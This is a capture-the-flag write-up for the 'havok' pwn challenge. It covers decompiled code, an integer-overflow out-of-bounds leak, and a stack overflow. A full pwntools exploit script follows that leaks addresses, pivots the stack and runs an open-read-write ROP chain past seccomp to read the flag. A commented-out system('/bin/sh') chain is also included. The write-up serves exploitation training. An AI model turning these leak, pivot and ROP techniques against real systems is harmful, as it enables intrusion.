### File information:

Download file: `Archive.zip`

Unzip the compressed file:
```
└─$ ls 
Archive.zip  Dockerfile  flag.txt  havok  ld-linux-x86-64.so.2  libc.so.6
```

Binary file `havok`:
```
└─$ file havok
havok: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, BuildID[sha1]=dbfdb67cc5c037eabc542700fb98ed98dcb8656e, with debug_info, not stripped                          
```
```
└─$ checksec --file=havok
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   60 Symbols  No     0               3               havok
```

___
Code extraced from ghidra:

`main()`:
```c
int main(void)

{
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("=====================================================");
  puts("   H A V O K \' S   C O S M I C   R I N G S");
  puts("=====================================================");
  puts("  Alex Summers channels the cosmic spectrum through");
  puts("  four concentric plasma rings.  Calibrate them.");
  puts("  Break them.  Claim what lies beyond.\n");
  setup_seccomp(); //////////////////////
  puts("[*] Ring calibration pass 1 of 2:");
  calibrate_rings();
  puts("\n[*] Ring calibration pass 2 of 2:");
  calibrate_rings();
  read_plasma_signature();
  inject_plasma();
  puts(&DAT_001023f8);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
`calibrate_rings()`:
```
void calibrate_rings(void)

{
  short idex;
  int num;
  size_t idx;
  long in_FS_OFFSET;
  short index;
  int i;
  int raw;
  anon_struct_48_3_decdb330 frame;
  char idx_buf [32];
  char label [128];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  frame.libc_anchor = (longlong)puts;       ////////////
  frame.pie_anchor = (longlong)main;        ////////////
  frame.ring_data[0] = -0x3f0011ffffffffff;
  frame.ring_data[1] = -0x3f0011fffffffffe;
  frame.ring_data[2] = -0x3f0011fffffffffd;
  frame.ring_data[3] = -0x3f0011fffffffffc;
  puts("[RING 1] Cosmic Ring Calibration Interface");
  puts(&DAT_00102040);
  memset(idx_buf,0,32);
  read(0,idx_buf,31);
  idx = strcspn(idx_buf,"\n");
  idx_buf[idx] = '\0';
  num = atoi(idx_buf);   ///////////////
  if (num < 0) {
    puts("[!] Negative indices are not permitted.");
  }
  else {
    idex = (short)num;      /////////////////
    if (idex < 4) {
      printf("[*] Ring-%d energy: 0x%016llx\n",(ulong)(uint)(int)idex,frame.ring_data[(int)idex]);
    }
    else {
      puts("[!] Index out of calibration range.");
    }
    puts("    Provide a label for this ring reading:");
    memset(label,0,128);
    read(0,label,127);
    idx = strcspn(label,"\n");
    label[idx] = '\0';
    for (i = 0; label[i] != '\0'; i = i + 1) {
      if (label[i] == '%') {
        label[i] = '_';
      }
    }
    printf("[LOG] %s\n",label);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
`read_plasma_signature()`:
```c
void read_plasma_signature(void)

{
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("\n[RING 3] Upload Plasma Signature (up to 256 bytes):");
  plasma_len = read(0,plasma_sig,256);
  if (plasma_len < 1) {
    puts("[!] No signature received.");
    plasma_len = 0;
  }
  else {
    printf("[*] Signature received (%zd bytes). Buffered in cosmic memory.\n",plasma_len);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
`inject_plasma()`:
```
void inject_plasma(void)

{
  int iVar1;
  char confirm [32];
  
  if (plasma_len == 0) {
    puts("[!] No plasma signature loaded. Aborting.");
  }
  else {
    iVar1 = validate_plasma();
    if (iVar1 == 0) {
      puts("[!] Plasma resonance failure. Signature purged.");
    }
    else {
      puts("\n[RING 3] Initiating plasma injection sequence...");
      puts("         Confirm injection key:");
      read(0,confirm,48);
      puts("[*] Injection acknowledged.");
    }
  }
  return;
}
```
Vulnerbilities:
* `setup_seccomp();`: we cannot use bin/sh attack
* `calibrate_rings()`:
  * We have **Integer Overflow** and **Out of bound** vuln in the code:
    ```c
    int num;

    frame.libc_anchor = (longlong)puts;     
    frame.pie_anchor = (longlong)main;    
    ...
    num = atoi(idx_buf);   ///////////////
    if (num < 0) {
      puts("[!] Negative indices are not permitted.");
    }
    else {
      idex = (short)num; /////////
      if (idex < 4) {
        printf("[*] Ring-%d energy: 0x%016llx\n",(ulong)(uint)(int)idex,frame.ring_data[(int)idex]); /////
      }
    ... 
    ```
    By entering a large unsigned number that exceed short datatype threshold, we convert `num` into negative number, and pass the value to `idex` which bypass the check `index < 4`. And therefore, leaking the address of `puts` and `main` in the program.

    This function is main() is called twice, so we leak them respectively.

* `inject_plasma()`:
  * There is no canary check in this function
  * We have BOF vulnerbility:
    ```c
    char confirm [32];
    ...
    read(0,confirm,48);
    ```
    A space of 16 bytes, which is enough to overwrite the RIP, indicating the use of `Stack pivot` trick in this case

* `read_plasma_signature()`:
  * The function takes a large input
    ```
    plasma_len = read(0,plasma_sig,256);
    ```
    With the previous `stack pivot` assumption, we can be certain that this is where our ROP payload lies.

    Since seccomp() is active, we will build a ORW (Open-Read-Write) payload to bypass the check.
___
script.py:
```python
from pwn import *

libc = ELF("./libc.so.6", checksec=False)
context.binary = exe = ELF("./havok", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br *calibrate_rings 
		br *calibrate_rings + 263
		br *calibrate_rings + 291
		br *calibrate_rings + 306
		br *read_plasma_signature
		br *inject_plasma
		br *inject_plasma + 131
		x plasma_sig
		''')

p = process(exe.path)

GDB()


### Leak phase
p.sendafter(b"3):", b"65535")

p.recvuntil(b"energy: ")
leak1 = p.recvline()
main = int(leak1[:-1], 16)
print(f"main: {hex(main)}")

plasma_sig = main + 0x2880
pie_base = main - 0x17e0

p.sendafter(b"reading:", b"AAAA")

p.sendafter(b"3):", b"65534")

p.recvuntil(b"energy: ")
leak2 = p.recvline()
libc_leak = int(leak2[:-1], 16)
print(f"libc: {hex(libc_leak)}")

p.sendafter(b"reading:", b"AAAA")

libc.address = libc_leak - libc.symbols['puts'] # 0x805a0

print(f"pie_base: {hex(pie_base)}")
print(f"plasma_sig: {hex(plasma_sig)}")
print(f"libc_base: {hex(libc.address)}")

### Payload sits here
# payload = b"AAAA"
# ret = pie_base + 0x101a
# rop = ROP(libc)
# pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
# system = libc.symbols['system']
# bin_sh = next(libc.search(b"/bin/sh"))

# payload = b"A" * 8
# payload += p64(pop_rdi)
# payload += p64(bin_sh)
# payload += p64(ret)
# payload += p64(system)
# p.sendafter(b"bytes):", payload)

pop_rdi = libc.address + 0x000000000010269a
pop_rsi = libc.address + 0x0000000000053887
pop_rdx_xor_eax = libc.address + 0x00000000000d6ffd

# --- 1. Construct and send the ORW Chain ---
bss_addr = pie_base + exe.bss()
flag_str_addr = bss_addr + 0x500 
read_buf = bss_addr + 0x600

# Padding for the pivot's 'pop rbp'
payload_sig = b"A" * 8 

# Stage 0: Read "flag.txt" from us into BSS
payload_sig += p64(pop_rdi) + p64(0)
payload_sig += p64(pop_rsi) + p64(flag_str_addr)
payload_sig += p64(pop_rdx_xor_eax) + p64(10) 
payload_sig += p64(libc.sym['read'])

# Stage 1: open(flag_str_addr, 0)
payload_sig += p64(pop_rdi) + p64(flag_str_addr)
payload_sig += p64(pop_rsi) + p64(0)
payload_sig += p64(libc.sym['open'])

# Stage 2: read(3, read_buf, 0x50)
payload_sig += p64(pop_rdi) + p64(3)
payload_sig += p64(pop_rsi) + p64(read_buf)
payload_sig += p64(pop_rdx_xor_eax) + p64(0x50)
payload_sig += p64(libc.sym['read'])

# Stage 3: write(1, read_buf, 0x50)
payload_sig += p64(pop_rdi) + p64(1)
payload_sig += p64(pop_rsi) + p64(read_buf)
payload_sig += p64(pop_rdx_xor_eax) + p64(0x50)
payload_sig += p64(libc.sym['write'])

payload_sig += p64(pop_rdi) + p64(0)
payload_sig += p64(libc.sym['exit'])

# Send the ROP chain
print(f"payload len: {len(payload_sig)}")
p.sendafter(b"bytes):", payload_sig)

### Stack pivot to payload
leave_ret = pie_base + 0x1224
print(f"leave_ret: {hex(leave_ret)}")

payload = b"A" * 32
payload += p64(plasma_sig)
payload += p64(leave_ret)
p.sendafter(b"injection key:", payload)

#==> injection acknowledged

sleep(0.1) 
p.send(b"flag.txt\x00")

p.interactive()
```
<img width="823" height="519" alt="image" src="https://github.com/user-attachments/assets/4e2dc5e2-370d-446d-bbb4-f530bc79692a" />

<img width="820" height="621" alt="image" src="https://github.com/user-attachments/assets/59e8cb14-a526-4938-bbdd-095c825ea290" />

<img width="806" height="781" alt="image" src="https://github.com/user-attachments/assets/b221c817-fad8-42d1-a08a-cbceced53a8f" />






